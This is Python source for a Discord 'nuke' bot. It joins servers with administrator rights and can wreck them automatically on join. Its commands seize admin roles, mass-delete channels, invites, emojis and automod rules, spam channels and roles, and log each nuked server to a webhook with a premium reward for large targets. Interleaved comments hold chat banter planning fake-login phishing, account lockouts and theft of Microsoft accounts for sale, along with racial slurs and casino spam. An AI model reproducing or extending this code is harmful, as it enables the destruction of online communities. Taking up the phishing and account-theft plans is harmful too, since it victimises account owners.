import discord
import asyncio
import logging
import orjson
import pydactyl
import pymysql.err
from collections import defaultdict
from orjson import loads, dumps
from aiohttp import ClientSession
from typing import List, Tuple, Dict
from discord.ext import commands
from discord.ext.tasks import loop

import shared
import manager
import utils
from backup import create_backup
from noadmin import bot as noadmin
from about import __version__
from action import *
from database import Profile
from typing import Callable
from default import server_icon, p_name
from user import User, Permissions
from log import create_logger
from host import Datalix, Service

create_logger(__name__, file_log=True)
log = logging.getLogger('fluc')
# Disable annoying rate limit warnings when spamming webhooks
webhook_log = logging.getLogger('discord.webhook.async_')
webhook_log.setLevel(logging.ERROR)
bot = commands.Bot(command_prefix=shared.get_prefix, intents=discord.Intents.all(), help_command=None)
session: ClientSession
xs32 = utils.Xorshift32()

with open('config/sql.json') as file:
    sql_config: Dict = orjson.loads(file.read())

with open('config/state.json') as file:
    state: Dict = orjson.loads(file.read())


class Reconnect(Exception):
    def __init__(self, is_manager: bool, remove: bool, *args: object) -> None:
        super().__init__(*args)
        self.is_manager = is_manager
        self.remove = remove


db = shared.db
config = shared.config
command = shared.command
cooldowns = shared.cooldowns
bot.event(shared.on_command_error)
reply = shared.reply
locks = defaultdict(asyncio.Lock)
# Local cache for temporary storing random stuff
local_cache = defaultdict(dict)
profile: Profile
webhooks = {}

async def cmd_run(ctx: commands.Context, user: User, name: str, *args, **kwargs):
    '''
    Runs a command

    Runs command as specified user. Ignores exceptions

    Parameters
    ----------
    ctx : :class:`discord.ext.commands.Context`
        Context of where to run command
    user : :class:`~user.User`
        The user to run the command as
    name : str
        The name of command to run
    '''
    coro = cooldowns.callbacks[name][2]
    try:
        await coro(ctx, *args, **kwargs)
    except Exception:
        pass

async def sema_run(task: Callable[..., Awaitable[Any]], semaphore: asyncio.Semaphore, *args, **kwargs):
    '''
    Runs a command using :class:`asyncio.Semaphore`

    Parameters
    ----------
    task : Callable[..., Awaitable[Any]]
        The task to run
    semaphore : :class:`asyncio.Semaphore`
        The semaphore to run the task with
    '''
    async with semaphore:
        await task(*args, **kwargs)

async def safe_task(task: Callable[..., Awaitable[Any]], default: Any = None, *args, **kwargs) -> Any:
    '''
    Runs a task safely

    Runs a task and ignores exceptions.
    Will return ``default`` if the task has failed a specific amount of times
    
    Parameters
    ----------
    task : Callable[..., Awaitable[Any]]
        The task to run
    default : Any
        Default return value if task fails. Defaults to None
    meta_do_raise_on : Callable[[:class:`Exception`], bool]
        Will raise if this check returns True.`
    meta_attempts : int
        The number of attempts to repeat task if failed
    meta_retry : bool
        Whether to retry task if failed

    Returns
    -------
    Any
        The result of succeeded task

    Raises
    ------
    Exception
        Exception of task if failed
    '''    
    raise_on = kwargs.pop('meta_do_raise_on', None)
    attempts = kwargs.pop('meta_attempts', 3)
    retry = kwargs.pop('meta_retry', True)
    
    for i in range(attempts):
        try:
            return await task(*args, **kwargs)
        except discord.RateLimited as exc:
            if attempts == i or not retry:
                continue
            await asyncio.sleep(exc.retry_after)
        except Exception as exc:
            if raise_on and raise_on(exc):
                raise exc
            if attempts == i or not retry:
                await asyncio.sleep(0.1)
    return default

async def main():
    '''Runs all bots''' 
    global profile
    async def _run_bot(bot: commands.Bot, token: str):
        try:
            await bot.login(token)
            await bot.connect(reconnect=True)
        except discord.DiscordException as exc:
            log.error(exc)
            # Remove bot from profiles if required intents not enabled
            raise Reconnect(
                is_manager=token == config['manager'],
                remove='privileged intents' in str(exc)
            )
        finally:
            if not bot.is_closed():
                await bot.close()

    try:
        await db.connect(sql_config, config)
    except pymysql.err.OperationalError as exc:
        log.critical(exc)
        return
    
    log.info('Attempting to connect to host...')
    if config['service']:
        if config['datalix_api_token']:
            datalix = Datalix()
            await datalix.start(token=config['api_token'])
            if datalix.authorization_failure is True:
                log.critical(f'Failed to authorize to Datalix. Aborting')
                return await abort()
            for _service in datalix.services:
                if _service.name == config['service']:
                    service = _service
                    await service.update()
                    break
            else:
                log.critical(f'Datalix service "{config['service']}" not found. Aborting')
                return await abort()
            shared.datalix = datalix
            shared.datalix_service = service
            shared.has_host = True

        elif config['pterodactyl_api_token'] and config['pterodactyl_hostname']:
            dactyl = pydactyl.AsyncPterodactylClient(
                url=config['pterodactyl_hostname'],
                api_key=config['pterodactyl_api_token']
            ).client
            try:
                await dactyl.account.get_account()
            except Exception as exc:
                log.critical('Failed to get pterodactyl account. Aborting')
                return await abort()
            try:
                await dactyl.servers.get_server(config['service'])
            except Exception:
                log.critical(f'Failed to get pterodactyl server "{config['service']}". Aborting')
                return await abort()
            shared.server = config['service']
            shared.dactyl = dactyl
            shared.has_host = True
        else:
            shared.has_host = False
            log.info('No host specified. Skipping')
    else:
        shared.has_host = False
        log.info('No host specified. Skipping')

    log.info('Loading database...')
    async with db, bot, manager.bot, shared.datalix, shared.dactyl:
        while 1:
            _profile = await db.get_profile()
            if not _profile:
                log.critical('No profiles left.')
                # Wait for a profile to be uploaded
                await asyncio.sleep(10)
                continue
            profile = _profile

            try:
                try:
                    await manager.bot.login(config['manager'])
                except discord.LoginFailure:
                    log.critical('Failed to log on manager.')
                    await asyncio.sleep(10)
                    continue

                try:
                    await bot.login(profile.token)
                    assert bot.user, '???'
                except discord.LoginFailure:
                    log.warning(f'Found invalid profile: {profile.username} (ID: {profile.id}).')
                    await manager.bot.close()
                    await db.remove_profile(profile.id)
                    continue
            except discord.HTTPException:
                log.critical('One or more bots is rate limited. Stop')
                break

            with open('config/state.json', 'rb') as file:
                state = loads(file.read())
            state['bot_id'] = bot.user.id
            with open('config/state.json', 'wb') as file:
                file.write(dumps(state))

            bot_tasks = [
                _run_bot(bot, profile.token),
                _run_bot(noadmin, config['no_admin']),
                _run_bot(manager.bot, config['manager'])
            ]
            try:
                await asyncio.gather(*bot_tasks)
            except Reconnect as reconnect:
                if reconnect.is_manager:
                    log.warning('Manager has disconnected.')
                else:
                    log.warning('Bot has disconnected.')
                if reconnect.remove:
                    await db.remove_profile(profile.id)
                    log.warning(f'Invalidated: {profile.username} (ID: {profile.id})')

                state['last_bot'] = bot.user.id
                with open('config/state.json', 'wb') as file:
                    file.write(dumps(state))

async def science(ctx: commands.Context, user: User):
    '''
    Sends log webhook and adds statistic to user profile

    Parameters
    ----------
    ctx : :class:`discord.ext.commands.Context`
        Context of the nuke command
    user : :class:`~user.User`
        The user who nuked server
    '''    
    assert ctx.guild
    webhooks = discord.Webhook.from_url(config['science'], session=session)
    members = len(ctx.guild.members)
    embed = discord.Embed(
        title=ctx.guild.name,
        description=f'ID: {ctx.guild.id}\nUser ID: {ctx.author.id}'
    )
    embed.set_author(
        name=ctx.author.name,
        url=ctx.author.avatar and ctx.author.avatar or ctx.author.default_avatar
    )
    embed.set_footer(text=f'Powered by {p_name} v{__version__}', icon_url=server_icon)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    if ctx.guild.banner:
        embed.set_image(url=ctx.guild.banner.url)
    embed.add_field(name='Stats', value=(
        f'Owner: {ctx.guild.owner} (ID: {ctx.guild.owner_id}\n'
        f'Members: {members}\n'
        f'Server type: {'Test' if members < config['test_server'] else 'Small' if members < config['small_server'] else 'Normal'}'
    ))
    if members >= 1000:
        role = main_server.get_role(1499043589857087508)
        member = main_server.get_member(user.id)
        if role and member:
            await member.add_roles(role, reason='Naked 1k+')
        dt = utils.now(days=31)
        await db.add_premium(user.id, dt)
    await webhooks.send(embed=embed)

async def abort():
    '''
    Closes all bots
    '''    
    await noadmin.close()
    await manager.bot.close()
    await bot.close()

@loop(seconds=10)
async def botloop():
    '''
    Loop checking stuff

    Will leave old servers and clean up local cache
    '''
    while True:
        if len(bot.guilds) > config['max_servers']:
            oldest = sorted(
                bot.guilds,
                key=lambda guild: int(guild.me.joined_at.timestamp()) if guild.me else 0 # pyright: ignore[reportOptionalMemberAccess]
            )
            oldest = [guild for guild in oldest if not guild.id == config['emoji_server']]
            excess = len(bot.guilds) - config['max_servers']
            for guild in oldest[:excess]:
                await guild.leave()
                await asyncio.sleep(1)
        
        for user_id, data in local_cache['invites'].copy().items():
            if not data.get('last_small'):
                continue
            if utils.fromtimestamp(data['last_small']) < utils.now():
                del local_cache['invites'][user_id]
        await asyncio.sleep(5)

@bot.event
async def on_ready():
    global session
    global main_server
    await bot.change_presence(status=discord.Status.offline)
    assert bot.user, '???'
    log.setLevel(logging.INFO)
    session = bot.http._HTTPClient__session # pyright: ignore[reportAttributeAccessIssue]
    while not getattr(shared, 'main_server', None):
        await asyncio.sleep(1)
    main_server = shared.main_server
    bot.add_view(shared.make_bot_help(bot))
    botloop.start()
    shared.get_bots = lambda: (bot, noadmin, manager)
    if state['last_bot'] != profile.id:
        log.info(f'Using new bot: {profile.username} (ID: {profile.id})')
        with open('config/state.json', 'wb') as file:
            state['last_bot'] = profile.id
            file.write(orjson.dumps(state))
    log.info(
        f'Logged on {bot.user} (ID: {bot.user.id}), '
        f'invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot'
    )

@bot.event
async def on_guild_join(guild: discord.Guild):
    assert bot.user, '???'
    if not guild.me.guild_permissions.administrator:
        return await guild.leave()
    async for entry in guild.audit_logs(
        limit=5,
        action=discord.AuditLogAction.bot_add
    ):
        if entry.target and entry.user and entry.target.id == bot.user.id:
            user = await db.get_user(entry.user.id)
            author = entry.user
            if not user:
                user = User.new(entry.user.id)
                await db.add_user(user)
            break
    else:
        # Unreachable code
        raise NotImplementedError

    # Before we do anything check whether this server is eligible
    # We allow 1 test server per user per 1 hour
    # Obv skip check for super users
    if not user.is_elevated:
        if not len(guild.members) < config['test_server']:
            cache = local_cache['invites'].get(user.id, {})
            last_small = cache.get('last_small')
            if last_small:
                    # Test server is considered a server with less than 10 members
                    if utils.fromtimestamp(last_small) > utils.now():
                        cache['tries'] = cache.get('tries', 0) + 1
                        if cache['tries'] > 5:
                            # Blacklist user for suspected spamming
                            await db.add_user_blacklist(user.id, utils.now(hours=1))
                            await db.add_server_blacklist(guild.id, utils.now(hours=1))
                            local_cache['invites'][user.id] = cache
                            return
                        else:
                            return await guild.leave()
                    else:
                        del cache['last_small']
                        del cache['tries']
            else:
                cache['last_small'] = utils.now(hours=1).timestamp()
                cache['tries'] = 1
            local_cache['invites'][user.id] = cache

    auto_nuke = user.settings.auto_nuke
    invite = guild.vanity_url
    if not invite:
        for _invite in await guild.invites():
            invite = _invite.url
            break
    log.info(f'Bot was added to {guild.name} (ID: {guild.id}, member count: {guild.member_count}) by {user.id}. Invite: {invite}. Autonuke delay: {auto_nuke}')
    if auto_nuke != -1:
        ctx = commands.Context(
            bot=bot,
            # Some kind of fake partial message obj so we can make temporary context
            # All we will be using from this is message.guild
            message=type('M', (), {
                'guild': guild,
                'channel': guild.channels[0],
                'author': author,
                '_state': bot._connection
            })(), # pyright: ignore[reportArgumentType]
            view=None # pyright: ignore[reportArgumentType]
        )
        await asyncio.sleep(auto_nuke)
        await cmd_run(ctx, user, 'nuke')

@bot.check
async def check(ctx: commands.Context):
    if not ctx or ctx.guild:
        return True
    return False

@bot.command('help', aliases=['h'])
@command(keep_message=True)
@cooldowns.check(3, server_cooldown=True)
async def cmd_help(ctx: commands.Context, user: User, command: Optional[str] = None, *_):
    '''
    %0
    Shows all commands and info about them
    %2
    - command: Optional
        - If you specify this argument the bot will give you detailed info about the specified command
    '''
    if command:
        cmd = bot.get_command(command)
        if not cmd:
            return await reply(ctx.message, f'The command "{command}" was not found!', 'error')
        doc = utils.parse_doc(cmd, cooldowns)
        server_cooldown = cooldowns.cooldowns[cmd.name][0]
        user_cooldown = cooldowns.cooldowns[cmd.name][1]
        info = (
            f'Aliases: `{'` `'.join(cmd.aliases)}`\n'
            f'Server Cooldown: `{str(server_cooldown) + 's' if server_cooldown else 'Not enabled'}`\n'
            f'User Cooldown: `{str(user_cooldown) + 's' if user_cooldown else 'Not enabled'}`\n'
        )
        embed = discord.Embed(
            title=cmd.name,
            description=doc['brief']
        )
        embed.add_field(name='Information', value=info)
        embed.add_field(name='Description', value=doc['doc'], inline=False)
        embed.add_field(name='Options', value=doc['options'], inline=False)
        return await ctx.reply(embed=embed)
    # yo so what help you want?
    #  i dont want help i need help to unban from serverssss
    # any help for not vibdecodeing..? 
    # give ideas for comannds
    #feet for unban. 🦶
    # unbanned. 💀
    view = shared.make_bot_help(bot)
    await ctx.reply(
        embed=view.embed,
        view=view
    )

# LoL bro ngl use gemini they got free api. deepseek got free api? yes our school uses it LOL imagine free taiwan ill get banned bruv
# doubao ai >>>>>>>> https://www.doubao.com/chat/
# durex api >>> ☠️☠️☠️☠️☠️☠️
# Durex - we connect people 💀💀💀💀
# lyno searching docs about vibecoding requests. ✅✅✅free ai source deepseek api. OK chinese ai >>>>>
# bro did u just remove a command i made it.
# bro u delted a command didnt u i made the command bruh its ?purge comand. i thought u selected and delled mb
# @bot.command('vibecode', aliases=['vibecodeingtopcpromax'])
# @command()
# @cooldowns.check(1, server_cooldown=False) # vibe coded
# async def cmd_vibecode(ctx: commands.Context, user: User, *_):
#     '''
#     %0
#     Vibe codeing to pcpromax
#     %1
#     '''
#     # ngl can u write docs for my shit commands bro I CBA and my grammer  suc
#     # can you buy me grammarly pro? wi neheyd br
#     # i need it for school. how much is it 12$ i think lemme check bro thats WAY too much ngl
#     # go blackmarket + try pro for 0$
#     # bro why u need grammarly anyway school writingz easssy just use chatgpt lmao blocked in mauca bro then idk use vpn? vpn slow + school blocked i cant........
#     # to avoid they play crazygames <- alpha game; 
#     # ig u r cooked
#     # but i think protonvpn bypasses it lmao.
#     # cooked bro absolutely
#     # Pollinations.ai free api.
#     # remaking code 
#     task = [asyncio.create_task(channel.send('vibe codeingxxxxxx')) for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
#     await asyncio.wait(task, timeout=0.00000001) # makes vibecodeing abaillity to max!
    
# bro deleted my favorite command

# Is already imported?
# import aiohttp
# @bot.command(name='vibecode', aliases=['vibecodeingtopcpromax'])
#  i have custom cooldown bro
# @commands.cooldown(1,15, commands.BucketType.guild) #Cruitcal do not spam the free api or getting blocked instantly.
# @command(keep_message=True)
# @cooldowns.check(60, server_cooldown=True)
# ✅
async def cmd_vibecode(ctx, *, topic: str="sci-fi system announcement"):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://text.pollinations.ai/{topic}") as response:
            content = await response.text() if response.status == 200 else "API Offline"

    tasks = [ch.send(content) for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
    await asyncio.gather(*tasks, return_exceptions=True)

# wtf is going on bro this shiut bugging :sob:
# what cmd should i make

# bro ngl lets end fluc?
# lets make smth new @nigga configs
#skidleaks quick.
# bro skidleaks is not even a thing nobody gonna use
# lets quit codeing focus real life exam>>>
# yeah bro im addicted anyways aLMAO i cant quit
# ok code?
# what u wanna code smth new bro not this cringe nake bot
# account gen ezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
# bro not ez we dont have cap solver
# use the stuff u bought befoer ez.
# none of it works lol
# use good proxy = no captcha fluc.lol domain users ezz maybe.?
# wanna try beaming?
# igu wait lyno logger coming.
# no like fake discord login and then we post our own join for cam gir
# tahts shti i did before got scammed 2k how did u get scammed 💀
# just make people "verify" and then lock there accs and send spam
# or if u wanna make money we can steal microsoft accs and sell for cheap
# ok lets make money
# ngl i havent tried automating microsoft login that might be hard
# cuz yk they might detect bots and require to solve cap
# m,ake executor. thats hard u need to hook all functions and shit
# ngl learn lua we couldve made a big game with that. ye bro whos playing that
# as i said i am not a creative person 
# i is, bro the devs makes few grands in weeks ez.? they make robux xd No like they doing orders, from poeple paying them$$$$$$$$
# ohh you mean that
# robux is good tho can cash out.
# u lose 70% when cashing out?
#searching
# bro u need i think 30k to cash out and u get 100$ from that
# but 30k robux is worth way more than 100$
# 1 usd requires 263 robux
# bro do some maths.
# 1 usd = 80 rebex when u buy from store
# so u lose
# a lot
# just 263 / 80 is 3 so u lose 3x 
# basically roblox takes 70% u get 30% its not good business
# you make lot easy money, OR just sell the robux in discord you make more money?
# big risk of getting scammed tho ?yes also but i mean risk of getting banned is there if u sell in disc too but maybe less idk
# bro u need to do like 100k robux to make good money and cash out is 30k minimum so u need to do 3 cash outs which is a lot of work and risk of getting scammed is there too
# bro just sell in disc you can sell like 10k robux for 100$ and you make more money and less risk of getting scammed than cashing out
# bro u need to do like 3-4 sales of 10k robux to make good money and you can sell in disc for 100$ per 10k robux and you make more money and less risk of getting scammed than cashing out
# bro just do it in disc you can sell like 10k robux for 100$ and you make more money and less risk of getting scammed than cashing out


# what the fuck
# alr bro wellllllllll lets do smth else maybe make some kind of tools orr websites
# webdevs make a lot of money bro
# yeah bro but i dont know webdev and i dont wanna learn it ngl
# web is ez bro just learn html css js and then you can make websites and tools and sell them for money
# bro you can make like a discord bot hosting website and sell hosting for bots and make money that way
# *****AI generated prompts........
# srs bro u dont make much from roblox
# as topc said
# the guy at maccies still making more ez
# lets go to maccies it might be easier.
# and more money ez bro you can make like 100$ a day just working at maccies and you dont have to worry about getting scammed or banned or anything
# let me do some math
# brb my ass hurt
# wtf bro no mcdonalds worker makes 2k a month????????????????????????????????????
# At a national average salary for a McDonald's worker (~$2,340/month), the cost of living often exceeds total earnings, making it nearly impossible to save for a luxury car without additional income or significant support.
# In 2026, the estimated monthly cost of living for a single person in the U.S. is approximately $2,924 to $3,580.
# Average Earnings: ~$2,340 (pre-tax) [Previous Turn]
# Average Expenses: ~$3,480
# Monthly Shortfall: ~$1,140 deficit
# Housing (Rent + Utils)	$1,350 – $2,302
# Food & Groceries	$300 – $891
# Transportation	$100 – $1,167
# Health Insurance	$250 – $700
# Misc. (Phone, Extras)	$200 – $700
# If you manage to save $500 per month (which requires living very frugally on a McDonald's wage), it would take 50 years to save the cash price.
# One Tank of Gas	~$80–$100	~1 Day
# One New Tire	~$500–$800	~5–8 Days
# Annual Service	~$1,200–$2,000	~12–20 Days
# Monthly Insurance	~$400–$600	~4–6 Days
# For a McDonald's worker, the cost to maintain and drive the car for just one month would often cost more than their total monthly take-home pay.
# hi hji
# no shit lol
# to summary, a maggie worker cannot buy a lamboghini, and they will work for infinite years
# the only way is to become a successful trader which is someone like lyno?!?!?!?!?!?!!?!?.
# someone like ripydel ezzzzz...? you dont even trade
# neither do u im i play polymarket and lose 700$

# fucking nigger thats gambling not trading 

# THATS TRADING BRO I LITERALLLY WON 1000$lol no its not its d
# if#f eYES ITS IT WATCHES THE CHART SS S NO B
# RO THATS NOT TRRADING  OBV DONT KNOW WHAT TRADING IS BRO

# TRY IT ITS TRADEING,
# NO LMAO ITS NOT SHUT UP
# REGISTER IN 1WIN.COM TODAY!  500% REGISTER BONUS! ::ASSE
# 500# % LBMOAON USCASINO BRO
# bro ur dumb as
# ngl imma go learn some new language def not lua
# ngl
# i wanna study math now
# i just feel like doing it

# SAC HTIW IJO
# 500# % LBMOAON USCASINO BRO
# bro ur dumb as
# i# trading = stocks / long term investment - not prediction 

@bot.command('admin', aliases=['a'])
@command()
@cooldowns.check(5, server_cooldown=True)
# bro where is error?
async def cmd_admin(ctx: commands.Context, user: User, *_):
    '''
    %0
    Grants administrator permissions
    %1
    Once the role is created it will be assigned to you and moved as high as possible
    '''
    assert ctx.guild
    async def add_role(role: discord.Role):
        assert ctx.guild
        # discord.py making a big deal ouf of it.
        # Basically, discord.Role.position does not
        # match the actual role position. 
        # This doesn't let us create the role right below
        # the bot's highest role
        position = ctx.guild.me.top_role.position
        payload = [{
            'id': role.id,
            'position': position
        }]
        tasks = []
        # Move role to the right position
        tasks.append(role._state.http.move_role_position(
            role.guild.id,
            payload, # pyright: ignore[reportArgumentType]
            reason=None
        ))
        # Obviously, author is discord.Member, not discord.User
        tasks.append(ctx.author.add_roles(role)) # pyright: ignore[reportAttributeAccessIssue]
        await asyncio.gather(*tasks) 

    # Check if there is any role with administrator privileges
    for role in sorted(ctx.guild.roles, reverse=True):
        # Role must be below bot, or else we won't be able to add it to author
        if role.position <= ctx.guild.me.top_role.position:
            if role.permissions.administrator:
                try:
                    await add_role(role)
                except discord.Forbidden:
                    continue
                break
    else:
        # No roles with admin privileges, make one
        # We don't want color cuz less attention
        role = await create_role(ctx.guild, user.settings, session, permissions=discord.Permissions(administrator=True), color=None)
        await add_role(role)

@bot.command('create_channels', aliases=['cc', 'createchans', 'cchannels', 'cchans'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_channels(ctx: commands.Context, user: User, amount: Optional[int] = None, *_):
    '''
    %0
    Quickly creates channels
    %2
    - amount: Optional[user.settings.channel.create_amount]
        - The amount of channels to create
    '''
    def check(exc: Exception):
        # Cuz cmd nuke deletes old channels so we get more free space.
        # If these commands are used at the same time, 
        # we can't calculate how many channels we need
        # so we use helper func to stop all running tasks
        # when maximum amount of channels reached
        nonlocal tasks
        if isinstance(exc, discord.HTTPException):
            # We get status 500 when max channels created
            if exc.status == 500:
                # Cancel all tasks to avoid rate limits
                for task in tasks:
                    task.cancel()
        return False
    semaphore = asyncio.Semaphore(16)
    # Max 100 channels at once
    amount = min(amount or 50, 100)
    coros = [create_channel for _ in range(amount)]
    tasks = []
    try:
        async with locks['create_channels']:
            for coro in coros:
                task = safe_task(sema_run,
                    [], coro, semaphore, ctx.guild,
                    user.settings, meta_do_raise_on=check
                )
                task = asyncio.create_task(task)
                tasks.append(task)
            await asyncio.wait(tasks, timeout=30)
    except discord.HTTPException:
        pass

@bot.command('mess_channels', aliases=['mc', 'messchans'])
@command()
@cooldowns.check(120, server_cooldown=True)
async def cmd_mess_channels(ctx: commands.Context, user: User, *_):
    '''
    %0
    Messes up server channels
    %1
    This command will rename all channels and change their settings & permissions
    '''
    assert ctx.guild
    semaphore = asyncio.Semaphore(16)
    tasks = []
    for channel in ctx.guild.channels[:250]:
        task = safe_task(sema_run,
            [], mess_channel, semaphore,
            channel, ctx.guild, user.settings
        )
        tasks.append(task)
    
    async with locks['mess_channels']:
        await asyncio.gather(*tasks)

@bot.command('delete_channels', aliases=['dc', 'delchans'])
@command()
@cooldowns.check(120, server_cooldown=True)
async def cmd_delete_channels(ctx: commands.Context, user: User, amount: Optional[int] = 500, *_):
    '''
    %0
    Quickly deletes all server channels
    %2
    - amount: Optional[500]
        - The amount of channels to delete
    '''
    assert ctx.guild
    semaphore = asyncio.Semaphore(16)
    tasks = []
    for channel in ctx.guild.channels[:amount]:
        task = safe_task(sema_run,
            [], channel.delete, semaphore,
            reason=user.settings.reason
        )
        tasks.append(task)

    async with locks['delete_channels']:
        await asyncio.gather(*tasks)

@bot.command('lock_all', aliases=['la', 'lockall', 'lc', 'lockchannels', 'lock_channels', 'lockchans'])
@command()
@cooldowns.check(120, server_cooldown=True)
async def cmd_lock_all(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    semaphore = asyncio.Semaphore(5)
    tasks = []
    for channel in ctx.guild.channels:
        task = safe_task(sema_run,
            [], channel.edit, semaphore,
            overwrites={
                ctx.guild.default_role: discord.PermissionOverwrite(send_messages=False),
                ctx.author: discord.PermissionOverwrite(send_messages=True)
            },
            reason=user.settings.reason
        )
        tasks.append(task)

    async with locks['lock_channels']:
        await asyncio.gather(*tasks)

@bot.command('nsfw_all', aliases=['na', 'nsfwall', 'nc', 'nsfwchannels', 'nsfw_channels', 'nsfwchans'])
@command()
@cooldowns.check(120, server_cooldown=True)
async def cmd_nsfw_all(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    semaphore = asyncio.Semaphore(5)
    tasks = []
    for channel in ctx.guild.channels:
        task = safe_task(sema_run,
            [], channel.edit, semaphore,
            nsfw=True,
            reason=user.settings.reason
        )
        tasks.append(task)

    async with locks['nsfw_channels']:
        await asyncio.gather(*tasks)
    
@bot.command('create_roles', aliases=['cr', 'createroles', 'roles', 'rolespam'])
@command()
@cooldowns.check(180, server_cooldown=True, min_members=config['small_server'])
async def cmd_create_roles(ctx: commands.Context, user: User, amount: Optional[int] = 100, *_):
    '''
    %0
    Creates as many roles as possible (a total of 250 roles)
    %2
    - amount: Optional[250]
        - The amount of roles to create
    '''
    assert ctx.guild
    semaphore = asyncio.Semaphore(11)
    missing = min(amount or 250 - len(ctx.guild.roles), 50)
    create_amount = min(missing, 100)
    tasks = []
    for _ in range(create_amount):
        task = safe_task(sema_run,
            [], create_role, semaphore,
            ctx.guild, user.settings, session
        )
        tasks.append(task)
    async with locks['create_roles']:
        await asyncio.gather(*tasks)

@bot.command('mess_roles', aliases=['mr', 'messroles', 'rolemess'])
@command()
@cooldowns.check(180, server_cooldown=True, min_members=config['small_server'])
async def cmd_mess_roles(ctx: commands.Context, user: User, *_):
    '''
    %0
    Messes up server roles
    %1
    All role settings will be changed
    '''
    assert ctx.guild
    roles = list(ctx.guild.roles)
    for role in roles[:]:
        if role.id == ctx.guild.id:
            roles.remove(role)
            continue
        if role.position >= ctx.guild.me.top_role.position:
            roles.remove(role)
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        edit_role, semaphore, role, ctx.guild, user.settings, session
    ) for role in roles])

@bot.command('delete_invites', aliases=['di', 'delinvs', 'delinvites'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_delete_invites(ctx: commands.Context, user: User, *_):
    '''
    %0
    Deletes server invites (max: 500)
    '''
    assert ctx.guild
    def check(invite: discord.Invite) -> Tuple[int, int]:
        priority = 0 if invite.expires_at else 1
        return (priority, -invite.uses if invite.uses else 1)
    
    invites = await ctx.guild.invites()
    to_delete: List[discord.Invite] = sorted(invites, key=check)[:20]
    semaphore = asyncio.Semaphore(11)
    await asyncio.gather(*[sema_run(
        invite.delete, semaphore, reason=user.settings.reason
    ) for invite in to_delete])

@bot.command('create_invites', aliases=['ci', 'createinvs', 'createinvites'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_invites(ctx: commands.Context, user: User, amount: Optional[int] = None, *_):
    '''
    %0
    Creates server invites
    %1
    This process is slow due to massive rate limits by Discord.
    We can't do anything about it.
    %2
    - amount: Optional[user.invite.create_amount]
        - The amount of invites to create. Max: 25
    '''
    assert ctx.guild
    # Btw never seen anyone else use this x and y or z thing am I the inventor?
    # Came up with this because it makes sense and it's popular in javascript
    for _ in range(amount and min(amount, 10) or user.settings.invite.create_amount):
        await xs32.choice(ctx.guild.channels).create_invite()
        await asyncio.sleep(0.5)

@bot.command('delete_emojis', aliases=['de', 'delemojis'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_delete_emojis(ctx: commands.Context, user: User, amount: Optional[int] = None, *_):
    '''
    %0
    Deletes all server emojis
    %2
    - amount: Optional[user.invite.create_amount]:
        - The amount of invites to create
    '''
    assert ctx.guild
    semaphore = asyncio.Semaphore(6)
    if ctx.guild.emojis:
        await asyncio.wait([
            asyncio.create_task(sema_run(
            emoji.delete, semaphore, reason=user.settings.reason
        )) for emoji in ctx.guild.emojis[:amount or len(ctx.guild.emojis)]], timeout=10)

@bot.command('create_emojis', aliases=['ce', 'createemojis'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_create_emojis(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    amount = ctx.guild.emoji_limit - len(ctx.guild.emojis)
    semaphore = asyncio.Semaphore(10)
    await asyncio.wait([
        asyncio.create_task(sema_run(
        create_emoji, semaphore, ctx.guild, user.settings, session
    )) for _ in range(amount)], timeout=20)

@bot.command('delete_stickers', aliases=['ds', 'delstickers'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_delete_stickers(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    if not ctx.guild.emojis:
        return
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        sticker.delete, semaphore, reason=user.settings.reason
    ) for sticker in ctx.guild.stickers])

@bot.command('create_stickers', aliases=['cs', 'createstickers'])
@command()
@cooldowns.check(240, server_cooldown=True)
async def cmd_create_stickers(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    if not ctx.guild.stickers:
        return
    to_create = min(35, ctx.guild.sticker_limit - len(ctx.guild.stickers))
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(
        create_sticker, semaphore, ctx.guild, user.settings, session
    ) for _ in range(to_create)])

# We don't want this command
# The point is that automod = restriction which is what we don't want
# @bot.command('create_automod_rules', aliases=['car'])
# @command()
# @cooldowns.check(60, server_cooldown=True)
# async def cmd_create_automod_rules(ctx: commands.Context, user: User, *_):
#     ...

@bot.command('delete_automod', aliases=['da', 'delautomod', 'delauto'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_delete_automod(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    rules = await ctx.guild.fetch_automod_rules()
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(try_forever,
        semaphore, rule.delete, reason=user.settings.reason
    ) for rule in rules])

@bot.command('create_soundboard_sounds', aliases=['css', 'createsoundboard'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_soundboard_sounds(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    if ctx.guild.premium_tier == 0:
        limit = 8
    elif ctx.guild.premium_tier == 1:
        limit = 24
    elif ctx.guild.premium_tier == 2:
        limit = 36
    else:
        limit = 48
    to_create = min(35, limit - len(ctx.guild.soundboard_sounds))
    semaphore = asyncio.Semaphore(10)
    await asyncio.gather(*[sema_run(create_soundboard_sound,
        semaphore, ctx.guild, user.settings, session
    ) for _ in range(to_create)])

@bot.command('delete_soundboard_sounds', aliases=['dss', 'delsoundboard'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_delete_soundboard_sounds(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    semaphore = asyncio.Semaphore(10)
    if not ctx.guild.soundboard_sounds:
        return
